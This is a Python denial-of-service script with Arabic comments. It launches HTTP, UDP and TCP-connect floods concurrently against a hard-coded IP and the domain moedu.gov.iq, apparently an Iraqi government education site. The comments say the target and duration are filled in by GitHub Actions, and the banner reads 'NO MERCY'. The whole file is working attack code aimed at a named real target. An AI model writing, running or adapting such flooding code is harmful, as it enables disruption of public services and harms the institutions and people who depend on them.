import asyncio
import socket
import random
import time
import ssl

# --- الإعدادات الرئيسية ---
TARGET_IP = "63.246.154.12"  # سيتم استبداله بواسطة GitHub Actions
DURATION = 600               # سيتم استبداله بواسطة GitHub Actions
TARGET_DOMAIN = "moedu.gov.iq"

# --- الرسائل الملونة للطباعة ---
class Color:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'

def print_warning(message):
    print(f"{Color.YELLOW}[WARNING] {message}{Color.RESET}")

def print_attack(message):
    print(f"{Color.RED}[ATTACK] {message}{Color.RESET}")

# --- النواقل الهجومية ---

# 1. ناقل HTTP Flood (L7)
async def http_flood_vector():
    print_attack("Engaging Layer 7: HTTP Flood Vector...")
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            reader, writer = await asyncio.open_connection(TARGET_IP, 80)
            request = (
                f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\n"
                f"Host: {TARGET_DOMAIN}\r\n"
                f"User-Agent: {random.randint(1, 99999)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            writer.write(request.encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        await asyncio.sleep(0.001) # إطلاق الطلبات بأسرع ما يمكن

# 2. ناقل UDP Flood (L4)
async def udp_flood_vector():
    print_attack("Engaging Layer 4: UDP Flood Vector...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            # إرسال حزم إلى منافذ عشوائية لإحداث فوضى
            sock.sendto(payload, (TARGET_IP, random.randint(1, 65535)))
        except Exception:
            pass
        await asyncio.sleep(0.001)

# 3. ناقل SYN Flood (L4)
async def syn_flood_vector():
    print_attack("Engaging Layer 4: SYN Flood Vector...")
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.setblocking(False)
                # إرسال طلب SYN فقط، وعدم إكمال المصافحة الثلاثية
                await asyncio.get_event_loop().sock_connect(sock, (TARGET_IP, random.choice([80, 443])))
        except Exception:
            pass
        await asyncio.sleep(0.001)

# --- المنسق الرئيسي ---
async def main():
    print("="*60)
    print_warning("         Black Hole - Brute Force Attack Protocol")
    print_warning("         USE WITH EXTREME CAUTION. NO MERCY.")
    print("="*60)
    print_attack(f"Target Acquired: {TARGET_IP}")
    print_attack(f"Attack Duration: {DURATION} seconds")
    print_attack("Initializing all attack vectors. Stand by for maximum impact.")
    
    # تشغيل جميع النواقل الهجومية الثلاثة في نفس الوقت
    await asyncio.gather(
        http_flood_vector(),
        udp_flood_vector(),
        syn_flood_vector()
    )
    print(f"{Color.GREEN}[SUCCESS] Black Hole has completed its cycle.{Color.RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_warning("\nBlack Hole disengaged manually.")
